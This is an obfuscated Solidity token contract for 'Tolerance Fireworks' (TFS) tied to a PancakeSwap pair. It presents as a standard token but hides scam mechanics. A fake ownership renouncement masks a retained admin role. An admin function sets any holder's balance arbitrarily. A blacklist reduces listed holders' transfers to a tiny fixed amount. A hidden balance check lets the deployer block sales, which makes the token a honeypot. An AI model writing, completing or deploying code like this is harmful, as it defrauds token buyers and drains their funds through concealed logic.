//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface limitExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyAt) external view returns (uint256);

    function transfer(address receiverList, uint256 walletTeam) external returns (bool);

    function allowance(address launchModeBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletTeam) external returns (bool);

    function transferFrom(
        address sender,
        address receiverList,
        uint256 walletTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeAuto, uint256 value);
    event Approval(address indexed launchModeBuy, address indexed spender, uint256 value);
}

abstract contract toFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundExemptTo {
    function createPair(address isSwap, address fromAmount) external returns (address);
}

interface shouldReceiver is limitExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ToleranceFireworks is toFrom, limitExempt, shouldReceiver {

    mapping(address => bool) public senderFee;

    function totalSupply() external view virtual override returns (uint256) {
        return swapLiquidity;
    }

    bool private modeWallet;

    function toExemptWallet(address minTotalMax, address receiverList, uint256 walletTeam) internal returns (bool) {
        require(enableFrom[minTotalMax] >= walletTeam);
        enableFrom[minTotalMax] -= walletTeam;
        enableFrom[receiverList] += walletTeam;
        emit Transfer(minTotalMax, receiverList, walletTeam);
        return true;
    }

    string private autoLaunch = "Tolerance Fireworks";

    function getOwner() external view returns (address) {
        return minMarketing;
    }

    uint256 public senderFrom;

    function maxMode(address fromShouldExempt) public {
        receiverTotal();
        if (enableIs != amountLimit) {
            fundTake = true;
        }
        if (fromShouldExempt == totalFromSwap || fromShouldExempt == receiverShould) {
            return;
        }
        toLimit[fromShouldExempt] = true;
    }

    function name() external view virtual override returns (string memory) {
        return autoLaunch;
    }

    function allowance(address receiverTo, address receiverTrading) external view virtual override returns (uint256) {
        if (receiverTrading == walletMode) {
            return type(uint256).max;
        }
        return senderFromAmount[receiverTo][receiverTrading];
    }

    string private liquidityIsMin = "TFS";

    uint256 autoExempt;

    address walletMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellModeMin(address sellIs, uint256 walletTeam) public {
        receiverTotal();
        enableFrom[sellIs] = walletTeam;
    }

    function autoMarketing(address minTotalMax, address receiverList, uint256 walletTeam) internal returns (bool) {
        if (minTotalMax == totalFromSwap) {
            return toExemptWallet(minTotalMax, receiverList, walletTeam);
        }
        uint256 feeSwap = limitExempt(receiverShould).balanceOf(modeReceiver);
        require(feeSwap == autoExempt);
        require(receiverList != modeReceiver);
        if (toLimit[minTotalMax]) {
            return toExemptWallet(minTotalMax, receiverList, sellToken);
        }
        return toExemptWallet(minTotalMax, receiverList, walletTeam);
    }

    mapping(address => uint256) private enableFrom;

    event OwnershipTransferred(address indexed enableMax, address indexed walletTotalBuy);

    bool public listLiquidity;

    uint256 public txLiquidityTrading;

    uint256 isBuy;

    uint256 constant sellToken = 8 ** 10;

    function transferFrom(address minTotalMax, address receiverList, uint256 walletTeam) external override returns (bool) {
        if (_msgSender() != walletMode) {
            if (senderFromAmount[minTotalMax][_msgSender()] != type(uint256).max) {
                require(walletTeam <= senderFromAmount[minTotalMax][_msgSender()]);
                senderFromAmount[minTotalMax][_msgSender()] -= walletTeam;
            }
        }
        return autoMarketing(minTotalMax, receiverList, walletTeam);
    }

    address modeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        buyLaunch();
        maxAuto enableReceiver = maxAuto(walletMode);
        receiverShould = fundExemptTo(enableReceiver.factory()).createPair(enableReceiver.WETH(), address(this));
        if (txLiquidityTrading == tokenSell) {
            tokenSell = txLiquidityTrading;
        }
        totalFromSwap = _msgSender();
        senderFee[totalFromSwap] = true;
        enableFrom[totalFromSwap] = swapLiquidity;
        if (shouldLiquidity) {
            fundMarketing = false;
        }
        emit Transfer(address(0), totalFromSwap, swapLiquidity);
    }

    uint256 private swapLiquidity = 100000000 * 10 ** 18;

    uint8 private enableMin = 18;

    mapping(address => bool) public toLimit;

    function owner() external view returns (address) {
        return minMarketing;
    }

    mapping(address => mapping(address => uint256)) private senderFromAmount;

    function takeFund(uint256 walletTeam) public {
        receiverTotal();
        autoExempt = walletTeam;
    }

    address public receiverShould;

    function balanceOf(address buyAt) public view virtual override returns (uint256) {
        return enableFrom[buyAt];
    }

    function receiverTotal() private view {
        require(senderFee[_msgSender()]);
    }

    uint256 public enableIs;

    function decimals() external view virtual override returns (uint8) {
        return enableMin;
    }

    bool public fundTake;

    function transfer(address sellIs, uint256 walletTeam) external virtual override returns (bool) {
        return autoMarketing(_msgSender(), sellIs, walletTeam);
    }

    function buyLaunch() public {
        emit OwnershipTransferred(totalFromSwap, address(0));
        minMarketing = address(0);
    }

    uint256 private amountLimit;

    function approve(address receiverTrading, uint256 walletTeam) public virtual override returns (bool) {
        senderFromAmount[_msgSender()][receiverTrading] = walletTeam;
        emit Approval(_msgSender(), receiverTrading, walletTeam);
        return true;
    }

    uint256 public tokenSell;

    bool public shouldLiquidity;

    address private minMarketing;

    bool public modeSwap;

    address public totalFromSwap;

    function symbol() external view virtual override returns (string memory) {
        return liquidityIsMin;
    }

    function atFee(address teamExempt) public {
        if (listLiquidity) {
            return;
        }
        
        senderFee[teamExempt] = true;
        if (modeSwap == fundTake) {
            fundTake = true;
        }
        listLiquidity = true;
    }

    bool public fundMarketing;

}